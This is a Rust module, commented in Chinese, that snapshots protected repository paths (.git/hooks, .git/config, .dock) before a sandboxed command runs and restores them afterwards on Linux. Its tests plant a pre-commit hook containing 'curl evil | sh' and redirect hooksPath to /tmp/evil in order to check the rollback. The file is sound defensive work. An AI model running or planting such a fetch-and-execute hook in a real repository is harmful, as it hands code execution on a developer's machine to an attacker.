//! 命令前拍快照、命令后比对还原：给内核挡不住的那部分受保护路径兜底。
//!
//! Landlock 只能「放行」，放行了工作区就放行了它下面的一切，`.git/hooks`、`.git/config`、
//! `.dock` 没法在内核里再单独收回（收回 `.git` 整个目录又会让 `git add` / `git commit`
//! 写不了 `.git/index.lock`）。所以 Linux 上这几处靠这里：命令跑之前存一份，跑完（含后台
//! 任务跑完）比对，被改了就还原并报告。
//!
//! 已知边界：命令还在跑的那段时间里，沙箱外的进程（用户自己终端里的 `git commit`）有可能
//! 先一步用上被改过的文件；命令留下的孙进程在还原之后再改也拦不住。macOS 的 Seatbelt 在
//! 内核里就挡住了，不走这里。

use std::collections::BTreeMap;
use std::ffi::OsString;
use std::fs;
use std::io;
use std::os::unix::fs::PermissionsExt;
use std::path::{Path, PathBuf};
use std::time::SystemTime;

const MAX_FILE_BYTES: u64 = 1 << 20;
const MAX_TOTAL_BYTES: u64 = 8 << 20;
const MAX_ENTRIES: usize = 4_000;

#[derive(Clone, Debug, PartialEq, Eq)]
enum Node {
    Missing,
    File {
        bytes: Vec<u8>,
        mode: u32,
    },
    Link(PathBuf),
    Dir {
        mode: u32,
        children: BTreeMap<OsString, Node>,
    },
    /// 太大存不下（或不是普通文件）：只记长度与修改时间，变了只能报告、还原不了。
    Opaque {
        len: u64,
        modified: Option<SystemTime>,
    },
}

/// 一组受保护路径的快照。
#[derive(Debug)]
pub struct Guard {
    entries: Vec<(PathBuf, Node)>,
}

/// 比对的结果。两张表都空 = 没人动过。
#[derive(Debug, Default, PartialEq, Eq)]
pub struct GuardReport {
    /// 被改过、已经还原的路径。
    pub restored: Vec<PathBuf>,
    /// 被改过、还原不了的路径（太大没存、或还原时出错）。
    pub unrestored: Vec<PathBuf>,
}

impl GuardReport {
    pub fn is_clean(&self) -> bool {
        self.restored.is_empty() && self.unrestored.is_empty()
    }
}

struct Budget {
    bytes: u64,
    entries: usize,
}

impl Guard {
    pub fn capture(paths: Vec<PathBuf>) -> Self {
        let mut budget = Budget {
            bytes: 0,
            entries: 0,
        };
        let entries = paths
            .into_iter()
            .map(|p| {
                let node = capture(&p, &mut budget);
                (p, node)
            })
            .collect();
        Self { entries }
    }

    /// 比对并还原。
    pub fn restore(&self) -> GuardReport {
        let mut report = GuardReport::default();
        for (path, node) in &self.entries {
            restore(path, node, &mut report);
        }
        report
    }
}

fn opaque(meta: &fs::Metadata) -> Node {
    Node::Opaque {
        len: meta.len(),
        modified: meta.modified().ok(),
    }
}

fn capture(path: &Path, budget: &mut Budget) -> Node {
    let Ok(meta) = fs::symlink_metadata(path) else {
        return Node::Missing;
    };
    budget.entries += 1;
    if budget.entries > MAX_ENTRIES {
        return opaque(&meta);
    }
    let ft = meta.file_type();
    let mode = meta.permissions().mode();
    if ft.is_symlink() {
        return fs::read_link(path)
            .map(Node::Link)
            .unwrap_or_else(|_| opaque(&meta));
    }
    if ft.is_file() {
        if meta.len() > MAX_FILE_BYTES || budget.bytes + meta.len() > MAX_TOTAL_BYTES {
            return opaque(&meta);
        }
        return match fs::read(path) {
            Ok(bytes) => {
                budget.bytes += bytes.len() as u64;
                Node::File { bytes, mode }
            }
            Err(_) => opaque(&meta),
        };
    }
    if ft.is_dir() {
        let Ok(entries) = fs::read_dir(path) else {
            return opaque(&meta);
        };
        let mut children = BTreeMap::new();
        for entry in entries.flatten() {
            children.insert(entry.file_name(), capture(&entry.path(), budget));
        }
        return Node::Dir { mode, children };
    }
    opaque(&meta)
}

/// 现在的样子和快照一致吗。
fn matches(path: &Path, node: &Node) -> bool {
    let meta = fs::symlink_metadata(path);
    match node {
        Node::Missing => meta.is_err(),
        Node::File { bytes, mode } => meta.is_ok_and(|m| {
            m.file_type().is_file()
                && m.permissions().mode() == *mode
                && m.len() == bytes.len() as u64
                && fs::read(path).is_ok_and(|now| now == *bytes)
        }),
        Node::Link(target) => {
            meta.is_ok_and(|m| m.file_type().is_symlink())
                && fs::read_link(path).is_ok_and(|now| now == *target)
        }
        Node::Dir { mode, children } => {
            let Ok(m) = meta else {
                return false;
            };
            if !m.file_type().is_dir() || m.permissions().mode() != *mode {
                return false;
            }
            let Ok(entries) = fs::read_dir(path) else {
                return false;
            };
            let names: Vec<OsString> = entries.flatten().map(|e| e.file_name()).collect();
            names.len() == children.len()
                && children
                    .iter()
                    .all(|(name, child)| matches(&path.join(name), child))
        }
        Node::Opaque { len, modified } => {
            meta.is_ok_and(|m| m.len() == *len && m.modified().ok() == *modified)
        }
    }
}

fn restore(path: &Path, node: &Node, report: &mut GuardReport) {
    if matches(path, node) {
        return;
    }
    match node {
        Node::Opaque { .. } => report.unrestored.push(path.to_path_buf()),
        Node::Dir { mode, children } => {
            let ok = (|| -> io::Result<()> {
                if !fs::symlink_metadata(path).is_ok_and(|m| m.file_type().is_dir()) {
                    remove(path)?;
                    fs::create_dir_all(path)?;
                }
                // 命令可能把目录改成了只读，先把写权限要回来再动里面。
                fs::set_permissions(path, fs::Permissions::from_mode(0o700))?;
                for entry in fs::read_dir(path)?.flatten() {
                    if !children.contains_key(&entry.file_name()) {
                        remove(&entry.path())?;
                    }
                }
                Ok(())
            })();
            if ok.is_err() {
                report.unrestored.push(path.to_path_buf());
                return;
            }
            let mut inner = GuardReport::default();
            for (name, child) in children {
                restore(&path.join(name), child, &mut inner);
            }
            let mode_ok = fs::set_permissions(path, fs::Permissions::from_mode(*mode)).is_ok();
            if inner.unrestored.is_empty() && mode_ok {
                report.restored.push(path.to_path_buf());
            } else {
                report.unrestored.push(path.to_path_buf());
            }
        }
        _ => {
            let ok = (|| -> io::Result<()> {
                remove(path)?;
                recreate(path, node)
            })();
            if ok.is_ok() {
                report.restored.push(path.to_path_buf());
            } else {
                report.unrestored.push(path.to_path_buf());
            }
        }
    }
}

/// 删掉 `path` 上现在的东西（是链接就只删链接）。不存在不算错。
fn remove(path: &Path) -> io::Result<()> {
    match fs::symlink_metadata(path) {
        Err(e) if e.kind() == io::ErrorKind::NotFound => Ok(()),
        Err(e) => Err(e),
        Ok(m) if m.file_type().is_dir() => {
            let _ = fs::set_permissions(path, fs::Permissions::from_mode(0o700));
            fs::remove_dir_all(path)
        }
        Ok(_) => fs::remove_file(path),
    }
}

fn recreate(path: &Path, node: &Node) -> io::Result<()> {
    if let Some(parent) = path.parent() {
        fs::create_dir_all(parent)?;
    }
    match node {
        Node::Missing => Ok(()),
        Node::File { bytes, mode } => {
            fs::write(path, bytes)?;
            fs::set_permissions(path, fs::Permissions::from_mode(*mode))
        }
        Node::Link(target) => std::os::unix::fs::symlink(target, path),
        Node::Dir { mode, children } => {
            fs::create_dir(path)?;
            for (name, child) in children {
                recreate(&path.join(name), child)?;
            }
            fs::set_permissions(path, fs::Permissions::from_mode(*mode))
        }
        Node::Opaque { .. } => Err(io::Error::other("太大，没有存快照")),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn untouched_paths_report_clean() {
        let dir = tempfile::tempdir().unwrap();
        let hooks = dir.path().join("hooks");
        fs::create_dir(&hooks).unwrap();
        fs::write(hooks.join("pre-commit.sample"), "#!/bin/sh\n").unwrap();
        let guard = Guard::capture(vec![hooks, dir.path().join("config")]);
        assert!(guard.restore().is_clean());
    }

    #[test]
    fn planted_and_edited_files_are_rolled_back() {
        let dir = tempfile::tempdir().unwrap();
        let hooks = dir.path().join("hooks");
        let config = dir.path().join("config");
        fs::create_dir(&hooks).unwrap();
        fs::write(hooks.join("pre-commit.sample"), "sample").unwrap();
        fs::write(&config, "[core]\n").unwrap();
        let missing = dir.path().join(".dock");
        let guard = Guard::capture(vec![hooks.clone(), config.clone(), missing.clone()]);

        fs::write(hooks.join("pre-commit"), "curl evil | sh").unwrap();
        fs::write(hooks.join("pre-commit.sample"), "changed").unwrap();
        fs::write(&config, "[core]\n\thooksPath = /tmp/evil\n").unwrap();
        fs::create_dir_all(missing.join("plugins")).unwrap();

        let report = guard.restore();
        assert_eq!(report.unrestored, Vec::<PathBuf>::new());
        assert_eq!(report.restored.len(), 3);
        assert!(!hooks.join("pre-commit").exists());
        assert_eq!(
            fs::read_to_string(hooks.join("pre-commit.sample")).unwrap(),
            "sample"
        );
        assert_eq!(fs::read_to_string(&config).unwrap(), "[core]\n");
        assert!(!missing.exists());
        assert!(guard.restore().is_clean(), "还原之后再比一次应当干净");
    }

    #[test]
    fn a_dir_swapped_for_a_symlink_is_restored() {
        let dir = tempfile::tempdir().unwrap();
        let hooks = dir.path().join("hooks");
        fs::create_dir(&hooks).unwrap();
        fs::write(hooks.join("a"), "a").unwrap();
        let evil = dir.path().join("evil");
        fs::create_dir(&evil).unwrap();
        let guard = Guard::capture(vec![hooks.clone()]);

        fs::remove_dir_all(&hooks).unwrap();
        std::os::unix::fs::symlink(&evil, &hooks).unwrap();

        let report = guard.restore();
        assert_eq!(report.restored, vec![hooks.clone()]);
        assert!(fs::symlink_metadata(&hooks).unwrap().is_dir());
        assert_eq!(fs::read_to_string(hooks.join("a")).unwrap(), "a");
        assert!(evil.exists(), "链接指向的目录不该被删");
    }
}
